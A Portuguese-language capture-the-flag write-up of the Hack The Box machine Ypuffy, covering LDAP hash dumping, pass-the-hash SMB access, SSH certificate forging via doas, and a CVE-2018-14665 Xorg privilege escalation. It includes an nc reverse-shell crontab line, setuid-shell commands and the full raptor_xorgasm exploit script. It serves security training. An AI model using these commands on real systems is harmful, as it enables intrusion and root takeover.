---
title: "Hack The Box - Ypuffy"
tags: [FreeBSD,Medium,Wireshark,Linpeas,Web]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/154>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 5 portas abertas no servidor

> Porta 22 - Servidor SSH

> Porta 80 - Servidor Web

> Portas 139, 445 - Servidor Samba

> Porta 389 - Ldap

## Enumeração da Porta 80

Bom, por se tratar de um servidor web, vamos acessar ele pra ver o que temos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_web.png)

Estranhamente ele da conexão resetada... mas a porta ta aberta?!

### Verificando Reponse Wireshark

Estranho... vamos analisar como é a response do Nmap e do Browser, tudo iso pelo wireshark

Essa é a resposta do Wireshark ao Nmap, estranho pq ali aparece como estando aberta, e quando tento acessar pelo navegador da como fechada

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_wire.png)

Quanto tento acessar pelo navegador, a response é essa

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_wire1.png)

Mando um SYN, o server responde com SYN, ACK ai eu peço o GET /, ele me responde com SYN, ACK eu falo ACK e depois ele manda um FIN, ACK... Estranho esse comportamento... ele deveria me dar a página, mas vamos prosseguir na enumeração de outras portas

## Enumeração da Porta 389

A porta 389 pelo que o Nmap nos mostrou está executando um servidor LDAP. Pela pesquisa do nmap também, ele nos mostrou bastante coisa interessante, que podemos fazer autenticação anonima por exemplo no servidor, vou demostrar de dois modos aqui como fazer o dump de hash que será utilizada para enumeração da porta 445

### Processo Automático

O nmap tem scripts que fazem isso de maneira "automática", scripts do NSE mesmo

`nmap -p 389 --script *ldap* 10.10.10.107`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_nmap1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_nmap2.png)

O que foi dado aqui de resposta? 

alice1978 -- 0B186E661BBDBDCF6047784DE8B9FD8B (hash da senha dela)

Isso foi o principal, mas o interessante mesmo é nos descobrirmos isso manualmente, procurando entender como é o funcionamento do ldap e como podemos extrair informações dele

### Processo Manual

Bom, vamo lá, primeiro vamos verificar quais são os scripts que eu posso rodar nessa máquina, scripts do NSE

> locate -r nse$ | grep ldap

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_nmap3.png)

Vamos descobrir quais são os `namingContexts` desse servidor, através da pesquisa do RootDSE, que contém as principais informações que precisamos, tais como o namingContexts

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_nmap4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_nmap6.png)

`nmap -p 389 --script ldap-rootdse.nse -Pn 10.10.10.107`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_nmap5.png)

Verificamos os namingContexts dele, agora vamos para o ldapsearch, fazemos uma pesquisa simples, com o `-x` que siginifica autenticação simples

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_nmap7.png)

Bom, ele retornou que há dados nessa base, no caso 32 results, vamos começar fazer o dump deles

Com a flag `-s`, de scope, escopo, que no caso será o base

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_nmap8.png)

Agora com o `-s base namingContexts`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_nmap9.png)

Agora scope = WholeSubTree (esse é o -s sub, não somente o base). Eu quero fazer o dump de toda a informação que o nmap deu

`ldapsearch -x -h 10.10.10.107 -s sub -b 'dc=hackthebox,dc=htb'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_nmap10.png)

Ai está o que queriamos, o hash da senha...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_nmap11.png)

Agora vamos iniciar a enumeração da porta 445

## Enumeração da Porta 445

Com o smbclient e com o hash da alice1978 podemos iniciar a nossa enumeração

`smbclient -L \\\\10.10.10.107 --pw-nt-hash -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B`

Verificamos que ela tem acesso a duas pastas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_smb.png)

Com o smbmap agora podemos verificar quais tipos de permissões ela tem em cada pasta

`smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' -H 10.10.10.107`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_smn1.png)

Com o flag `-R` no final, podemos fazer isso recursivamente, inclusive dentro da pasta em que ela tem permissão de leitura e escrita

`smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' -H 10.10.10.107 -R`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_smb1.png)

Opa, vamos baixar esse arquivo ai que apareceu, private key... Interessante! (Poderiamos ter baixado com o smbclient também, tanto faz)

`smbmap -u alice1978 -p '0B186E661BBDBDCF6047784DE8B9FD8B:0B186E661BBDBDCF6047784DE8B9FD8B' -H 10.10.10.107 --download alice/my_private_key.ppk`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_smb2.png)

# Conectando como Alice (SSH)

A chave que baixamos da máquina é no formato `.ppk`, ou seja, tem tanto a chave pública quanto a privada no mesmo arquivo, para ser usável devemos converter ela para um formato OpenSSH

Pesquisamos pra ver do que se trata e descobrimos que são feitos a partir do `PuTTYgen`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_putty.png)

Então instalamos ele na nossa máquina

`apt install putty-tools` (Já estava instalado)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_putty1.png)

A sintaxe dele é simples

`puttygen 10.10.10.107-alice_my_private_key.ppk -O private-openssh -o alice.key`

> -O -> tipo de chave, no caso private-openssh

> -o -> qual vai ser o arquivo que vai receber os dados

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_putty2.png)

Agora nos conectamos no servidor como alice

`ssh -i alice.key alice1978@10.10.10.107`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_putty3.png)

# Escalação de Privilégio (Alice1978 - Root)

Essa escalação peguei o passo a passo do `0xdf` que explicou muito bem em seu blog

Bom, uma vez dentro da máquina vamos iniciar a escalação de privilégio para root. Vamos rodar o `linpeas` na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin.png)

> https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin1.png)

Baixamos para nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin2.png)

Agora rodamos na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin3.png)

Encontramos algo interessante a respeito do arquivo `doas.conf`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin4.png)

Também poderíamos ter encontrado esse caminho logo na pasta home do usuário, quando damos um `ls -la` e percebemos que não existe pasta `.ssh` (Sim, não existe, mas estamos em uma conexão ssh, no mínimo estranho)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin5.png)

## Checando arquivos do SSH

Estranho, que tal darmos uma olhada nos arquivos de configuração do ssh, pra ver se encontramos algo lá

`grep -vE "^#" /etc/ssh/sshd_config | grep .` - Assim não serão mostradas as linhas que possuem comentários

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin6.png)

PermitRootLogin prohibit-password - Aqui diz que o login de root é permitido, mas somente sem senha

Essas linhas dizem algo sobre as chaves autorizadas para acessar e como é feito essa autenticação
```
AuthorizedKeysFile      .ssh/authorized_keys
AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u
AuthorizedKeysCommandUser nobody
TrustedUserCAKeys /home/userca/ca.pub
AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
AuthorizedPrincipalsCommandUser nobody
```

Essas linhas desabilitam a autenticação por senha, o challenge na autenticação e o X11 Forwading
```
PasswordAuthentication no
ChallengeResponseAuthentication no
AllowAgentForwarding no
AllowTcpForwarding no
X11Forwarding no
```

## Entendendo o que está acontecendo

A autenticação por chaves é considerado um dos jeitos mais fáceis e seguros de se conectar em servidores, inclusive muito mais seguro do que se conectar com senhas. Mas bem, vamos pensar em uma empresa grande, que possui muitos servidores e usuários, controlar todas essas chaves ssh será um grande trabalho. Se a equipe de TI quiser dar acesso à alguém vai ter que entrar em todos os arquivos authorized_keys e atualizar eles. Se alguém sair da empresa, terá que tirar o acesso, ou seja, muito trabalhoso.

Outro modo que SSH faz a autenticação é através de certificados assinados. Você configura cada servidor pra "confiar" no CA (Certificate Authority) e ele assina e da acesso. No caso conseguimos ver ali pelo arquivo de configuração do ssh `AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u` a CA é o localhost

Há um post do facebook que ele explica bem isso (https://engineering.fb.com/production-engineering/scalable-and-secure-access-with-ssh/)

Mas eu dei uma pesquisada a mais, pra verificar como são os modos de se fazer autenticação via SSH e realmente são os três principais modos. 1) Por senha. 2) Por chave e 3) Por certificado (essa máquina).

## Enumerando CA

Com a ideia do que está acontecendo na máquina, vamos iniciar a enumeração desse CA

Vamos iniciar pela enumeração do usuário `alice1978`

`AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u`

`/usr/local/bin/curl 'http://127.0.0.1/sshauth?type=keys&username=alice1978'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin7.png)

Realmente é o que parece ser, uma chave ssh da alice1978, e ela bate com a chave que temos na nossa máquina. Poderíamos continuar na enumeração aqui, mas pelo visto só nos mostra chaves públicas, e eu não vou conseguir acesso a máquina a partir de chaves públicas

## Enumerando Authorized Principles

O outro Curl que tem ali, é o AuthorizedPincipalsCommand. O principal é o link entre o certificado e a conta que está habilitada para acessar ele pelo certificado. Se eu faço a requisição para o usuário, a API me retorna o nome do usuário

`/usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u`

`curl -s "http://127.0.0.1/sshauth?type=principals&username=alice1978"`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin8.png)

Testamos com o bob também (encontramos ele no ldap antes)

`curl -s "http://127.0.0.1/sshauth?type=principals&username=bob8791"`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin9.png)

Hummm... pelo visto esses são os usuários que tem certificado, se fizermos um loop pelo /etc/passwd, será que não rola?

`cat /etc/passwd | grep -v ^_ | awk -F: '{print $1}'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin10.png)

Agora jogamos na API e vemos o resultado

`for i in $(cat  /etc/passwd | grep -v ^_ | awk -F: '{print $1}'); do /usr/local/bin/curl "http://127.0.0.1/sshauth?type=principals&username=$i"; done`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin11.png)

Estranho, apenas uma saída, vamos ver de quem é essa saída

`for i in $(cat /etc/passwd | grep -v ^_ | awk -F: '{print $1}'); do echo -n "$i:"; /usr/local/bin/curl "http://127.0.0.1/sshauth?type=principals&username=$i"; done`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin12.png)

Do root! Estranho, duas coisas podemos verificar aqui. A primeira delas é não ter saída de alice1978 e do bob, isso ocorre pq o ssh está utilizando métodos de autenticação diferentes do /etc/passwd, e outra é esse que está no root, ele não está ai a toa deve ter algum significado... vamos prosseguir

## Enumerado DOAS

Esse doas, é como se fosse o `sudo -l` do linux... mas como é FreeBSD é um pouco diferente, vamos ler esse arquivo, pra ver o que podemos fazer

`cat /etc/doas.conf`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin13.png)

Opa, ali aparece o que estava no `linpeas` que a alice1978 pode rodar o ssh-keygen como se root fosse

## Assinando certificado como root

Agora ficou mais ou menos claro o que podemos fazer para escalar privilégio nessa máquina. Com a minha habilidade de rodar o ssh-keygen como root, e sabendo do principals do root, podemos assinar o certificado como se root fosse e ganhar acesso de root na máquina

Primeira coisa é fazer um par de chaves SSH na nossa máquina Kali mesmo

`ssh-keygen -f ypuffy_root`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin14.png)

Mandamos ela para a máquina Ypuffy agora

`scp -i alice.key ypuffy_root.pub alice1978@10.10.10.107:/tmp/`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin15.png)

Agora vamos assinar essa chave usando o `ssh-keygen` e o `doas`

`chmod +r ypuffy_root.pub`

`doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I backdoor -n 3m3rgencyB4ckd00r ypuffy_root.pub`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin16.png)

Primeiro deixamos ele para ser lido com o `chmod +r`. Depois com o `-s /home/userca/ca` especifiquei que quero assinar uma chave publica com uma privada. `-I backdoor` coloquei como sendo de quem será esse certificado, o nome do usuário (em uma empresa, o nome do empregado). `-n 3m3rgencyB4ckd00r`, é o principles que vai estar associdado, no caso o do root. `ypuffy_root.pub` qual chave vai estar associdada com o certificado, no caso o par que eu tenho

Verificamos que foi criado um arquivo .pub `ypuffy_root-cert.pub`, no caso, é esse arquivo que está assinado pelo CA, vamos passar esse arquivo para nossa Kali agora

`scp -i alice.key alice1978@10.10.10.107:/tmp/ypuffy_root-cert.pub .`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin17.png)

Agora vamos verificar se a chave realmente está OK

`ssh-keygen -L -f ypuffy_root-cert.pub`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin18.png)

A princípio está tudo OK...

Agora eu preciso que a minha chave privada e o .pub estejam na mesma pasta, pra eles poderem fazer a autenticação corretamente, no caso estão

`ls ypuffy_root*`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin19.png)

Agora é conectar e virar root

`ssh -i ypuffy_root root@10.10.10.107`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin20.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_user.png)

# Algo a mais

Temos outro modo de se escalar privilégio nessa máquina também

Essa máquina foi liberada em setembro de 2018, e um mês depois, uma CVE foi liberada, a CVE-2018-14665, identificando permissões no `Xorg` que habilitam usuários a virar root. A vulnerabilidade é simples, assumindo que o Xorg roda com setuid, eu posso sobrescrever um arquivo de log com o que o usuário dizer para escrever.

Tem vários exploits no GitHub que fazem isso automaticamente, mas vamos fazer primeiro manual, pra entender o que está acontecendo. Novamente, o que será feito aqui ta melhor explicado no blog do `0xdf`

## Manual

Com a vulnerabilidade em mente, temos vários pontos para explorar, vamos fazer primeiro o `crontab`

`Xorg -fp "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.3 443 > /tmp/f" -logfile crontab :1 &`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin21.png)

Você verá que é preciso matar ela (Control+C), mas foi escrito no crontab do root, agora é esperar na Kali com o nc aberto na porta 443 que irá vir a conexão de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin22.png)

Outro modo é fazer um arquivo com setuid shell, no caso eu copiei o sh para roota e setei setuid nele com `chmod 4777`

`Xorg -fp "* * * * * root cp /bin/sh /usr/local/bin/roota; chmod 4777 /usr/local/bin/roota" -logfile crontab :1 &`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin23.png)

Depois de um minuto, só executar o `/usr/local/bin/roota` e viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin24.png)

## Automático

Agora vamos fazer do modo automático, uma vez que você já entendeu a vulnerabilidade, pesquisamos pela versão do Kernel na internet pro modos de escalação de privilégio

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin25.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin26.png)

Encontramos esse

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin27.png)

Copiamos ele para a máquina, e executamos

exploit.sh
```
# Exploit Title: xorg-x11-server 1.20.3 - Privilege Escalation
# Date: 2018-10-27
# Exploit Author: Marco Ivaldi
# Vendor Homepage: https://www.x.org/
# Version: xorg-x11-server 1.19.0 - 1.20.2
# Tested on: OpenBSD 6.3 and 6.4
# CVE : CVE-2018-14665

# raptor_xorgasm

#!/bin/sh

#
# raptor_xorgasm - xorg-x11-server LPE via OpenBSD's cron
# Copyright (c) 2018 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# A flaw was found in xorg-x11-server before 1.20.3. An incorrect permission 
# check for -modulepath and -logfile options when starting Xorg. X server 
# allows unprivileged users with the ability to log in to the system via 
# physical console to escalate their privileges and run arbitrary code under 
# root privileges (CVE-2018-14665).
#
# This exploit targets OpenBSD's cron in order to escalate privileges to
# root on OpenBSD 6.3 and 6.4. You don't need to be connected to a physical
# console, it works perfectly on pseudo-terminals connected via SSH as well.
#
# See also:
# https://lists.x.org/archives/xorg-announce/2018-October/002927.html
# https://www.exploit-db.com/exploits/45697/
# https://gist.github.com/0x27/d8aae5de44ed385ff2a3d80196907850
#
# Usage:
# blobfish$ chmod +x raptor_xorgasm
# blobfish$ ./raptor_xorgasm
# [...]
# Be patient for a couple of minutes...
# [...]
# Don't forget to cleanup and run crontab -e to reload the crontab.
# -rw-r--r--  1 root  wheel  47327 Oct 27 14:48 /etc/crontab
# -rwsrwxrwx  1 root  wheel  7417 Oct 27 14:50 /usr/local/bin/pwned
# blobfish# id
# uid=0(root) gid=0(wheel) groups=1000(raptor), 0(wheel)
#
# Vulnerable platforms (setuid Xorg 1.19.0 - 1.20.2):
# OpenBSD 6.4 (Xorg 1.19.6) [tested]
# OpenBSD 6.3 (Xorg 1.19.6) [tested]
#

echo "raptor_xorgasm - xorg-x11-server LPE via OpenBSD's cron"
echo "Copyright (c) 2018 Marco Ivaldi <raptor@0xdeadbeef.info>"

# prepare the payload
cat << EOF > /tmp/xorgasm
cp /bin/sh /usr/local/bin/pwned # fallback in case gcc is not available
echo "main(){setuid(0);setgid(0);system(\"/bin/sh\");}" > /tmp/pwned.c
gcc /tmp/pwned.c -o /usr/local/bin/pwned # most dirs are mounted nosuid
chmod 4777 /usr/local/bin/pwned
EOF
chmod +x /tmp/xorgasm

# trigger the bug
cd /etc
Xorg -fp "* * * * * root /tmp/xorgasm" -logfile crontab :1 &
sleep 5
pkill Xorg

# run the setuid shell
echo
echo "Be patient for a couple of minutes..."
echo
sleep 120
echo
echo "Don't forget to cleanup and run crontab -e to reload the crontab."
ls -l /etc/crontab*
ls -l /usr/local/bin/pwned
/usr/local/bin/pwned
```

Somos root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-ypuffy/Y_lin28.png)